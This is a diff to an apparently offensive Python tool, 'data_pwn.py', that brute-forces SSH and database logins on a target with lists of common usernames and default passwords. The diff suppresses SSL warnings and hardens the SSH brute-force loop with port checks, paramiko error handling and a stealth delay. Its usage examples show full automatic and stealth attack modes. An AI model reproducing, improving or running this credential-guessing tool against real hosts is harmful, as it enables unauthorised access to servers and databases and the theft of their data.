@@ -1,7 +1,4 @@
 #!/usr/bin/env python3
-import warnings
-warnings.filterwarnings('ignore')
-
 """
 ╔═══════════════════════════════════════════════════════════════╗
 ║                                                               ║
@@ -17,6 +14,20 @@ warnings.filterwarnings('ignore')
 ╚═══════════════════════════════════════════════════════════════╝
 """
 
+# ============================================================
+# SUPPRESS SSL WARNINGS
+# ============================================================
+import warnings
+warnings.filterwarnings('ignore', message='Unverified HTTPS request')
+warnings.filterwarnings('ignore', category=DeprecationWarning)
+warnings.simplefilter('ignore')
+
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ============================================================
+# IMPORTS
+# ============================================================
 import os
 import sys
 import subprocess
@@ -29,7 +40,11 @@ import shutil
 import argparse
 from datetime import datetime
 from typing import Dict, List, Optional, Tuple
+
+# Suppress SSL warnings for requests too
 import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # ============================================================
 # CONFIGURATION
@@ -472,9 +487,17 @@ class DataPwn:
         """Run service attacks (SSH, DB brute force)"""
         self.logger.scan("Phase 3: Service Attacks")
         
-        # Check for SSH
+        # Check for SSH - with better handling
         if '22' in self.port_info:
-            self.run_ssh_attack()
+            # Only try if port is actually open
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                if sock.connect_ex((self.target, 22)) == 0:
+                    self.run_ssh_attack()
+                sock.close()
+            except:
+                self.logger.warning("SSH port unreachable - skipping")
         
         # Check for databases
         db_ports = [p for p in self.port_info.keys() if int(p) in Config.DB_PORTS]
@@ -486,36 +509,76 @@ class DataPwn:
         self.logger.success("Service attacks completed")
     
     def run_ssh_attack(self):
-        """SSH brute force (simple fallback)"""
-        self.logger.scan("Running SSH brute force...")
+        """SSH brute force with clean error handling"""
+        self.logger.scan("Checking SSH...")
+        
+        # Quick check if SSH is responsive
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            if sock.connect_ex((self.target, 22)) != 0:
+                self.logger.warning("SSH port closed - skipping")
+                sock.close()
+                return
+            sock.close()
+        except:
+            self.logger.warning("SSH check failed - skipping")
+            return
         
         users = ['root', 'admin', 'user', 'ubuntu', 'test']
-        passwords = Config.DEFAULT_PASSWORDS
+        passwords = Config.DEFAULT_PASSWORDS[:20]
         
         for user in users:
-            for password in passwords[:20]:  # Only try first 20
+            for password in passwords:
                 try:
                     import paramiko
                     client = paramiko.SSHClient()
                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                    client.connect(self.target, username=user, password=password, timeout=3)
+                    
+                    client.connect(
+                        self.target, 
+                        username=user, 
+                        password=password, 
+                        timeout=3,
+                        allow_agent=False,
+                        look_for_keys=False
+                    )
                     self.logger.found(f"SSH credentials: {user}:{password}")
                     self.credentials['ssh'] = {'user': user, 'password': password}
                     client.close()
                     return
-                except:
+                except paramiko.AuthenticationException:
                     pass
+                except paramiko.SSHException:
+                    self.logger.warning("SSH protocol error - skipping")
+                    return
+                except socket.timeout:
+                    self.logger.warning("SSH timeout - skipping")
+                    return
+                except ConnectionResetError:
+                    self.logger.warning("SSH connection reset - skipping")
+                    return
+                except Exception:
+                    pass
+                finally:
+                    try:
+                        client.close()
+                    except:
+                        pass
+                
                 time.sleep(0.5 if not self.stealth_mode else 2)
+        
+        self.logger.info("SSH brute force completed - no credentials found")
     
     def run_db_attack(self, port: str, db_type: str):
         """Database brute force"""
         self.logger.scan(f"Checking {db_type} on port {port}...")
         
         users = ['root', 'admin', 'postgres', 'sa', 'test']
-        passwords = Config.DEFAULT_PASSWORDS
+        passwords = Config.DEFAULT_PASSWORDS[:10]
         
         for user in users[:3]:
-            for password in passwords[:10]:
+            for password in passwords:
                 if self.test_db_connection(db_type, user, password):
                     self.logger.found(f"{db_type} credentials: {user}:{password}")
                     self.credentials[db_type] = {'user': user, 'password': password}
@@ -759,7 +822,7 @@ def main():
         epilog="""
 Examples:
   python3 data_pwn.py -t example.com              # Interactive mode
-  python3 data_pwn.py -t example.com -a           # Full automatic attack
+  python3 data_pwn.py -t example.com -a           # Full
   python3 data_pwn.py -t example.com -a --stealth # Stealth mode
   python3 data_pwn.py -t example.com -r           # Recon only
         """
